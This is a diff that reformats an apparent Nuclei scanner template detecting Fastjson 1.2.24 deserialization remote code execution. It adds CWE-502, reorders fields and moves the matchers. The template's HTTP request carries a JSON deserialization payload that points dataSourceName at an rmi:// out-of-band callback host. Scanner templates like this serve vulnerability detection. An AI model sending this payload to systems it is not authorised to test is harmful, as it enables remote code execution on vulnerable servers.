@@ -1,5 +1,4 @@
 id: fastjson-1-2-24-rce
-
 info:
   name: Fastjson 1.2.24 - Remote Code Execution
   author: zh
@@ -12,14 +11,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-502,CWE-77
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 2
-  tags: fastjson,rce,deserialization,oast,vulhub,vuln
-
+  tags: deserialization,fastjson,oast,rce,vulhub,vuln
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - condition: and
+        type: word
+        words:
+          - Internal Server Error
+          - "500"
+    matchers-condition: and
+    raw:
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -42,19 +51,4 @@ http:
            "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
            "autoCommit":true
         }
-
     stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        condition: and
-        words:
-          - "Internal Server Error"
-          - "500"
-
